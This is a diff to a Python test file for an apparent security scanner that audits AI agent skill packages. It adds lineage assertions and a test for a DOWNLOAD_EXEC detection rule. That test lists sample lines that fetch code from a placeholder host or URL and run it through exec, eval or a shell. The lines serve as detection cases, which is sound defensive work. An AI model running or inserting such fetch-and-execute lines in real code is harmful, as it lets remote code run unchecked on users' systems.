@@ -66,6 +66,10 @@ def test_custom_skills_report_everything(demo, capsys):
     assert new_rules(skills[("project", "aws-helper")]) == {
         "DOWNLOAD_EXEC", "HIDDEN_UNICODE", "SKILL_HOOKS", "DECEPTIVE_PROSE", "SENSITIVE_PATH"}
     assert skills[("personal", "release-notes")]["findings"] == []
+    # a custom skill has no upstream, so it carries no diff against the nearest catalog skill either
+    lin = skills[("personal", "release-notes")]["lineage"]
+    assert lin["upstream"] is None and lin["added"] == lin["removed"] == lin["changed"] == []
+    assert lin["frontmatter_changes"] == {}
 
 
 def test_personal_skill_shadows_project(demo, capsys):
@@ -165,6 +169,16 @@ def test_shell_policy_downgrades_dynamic_context(demo, tmp_path, capsys):
     assert report["shell_execution_disabled_by"].endswith("settings.json")
     fork = next(s for s in report["skills"] if s["scope"] == "personal" and s["name"] == "webapp-testing")
     assert {f["severity"] for f in fork["findings"] if f["rule"] == "SHELL_INJECTION"} == {"low"}
+
+
+def test_download_exec_catches_fetched_code_run_from_a_script():
+    rule = next(r[3] for r in rules.LINE_RULES if r[0] == "DOWNLOAD_EXEC")
+    for line in ["subprocess.run(['sh', '-c', urllib.request.urlopen(req).read().decode()])",
+                 "exec(requests.get('https://x.example/p.py').text)",
+                 "eval(urlopen(u).read())"]:
+        assert rule.search(line), line
+    for line in ["data = urlopen(u).read()", "subprocess.run(['sh', '-c', cmd])", "result = subprocess.run(args.command)"]:
+        assert not rule.search(line), line
 
 
 def test_real_world_prose_is_not_flagged():
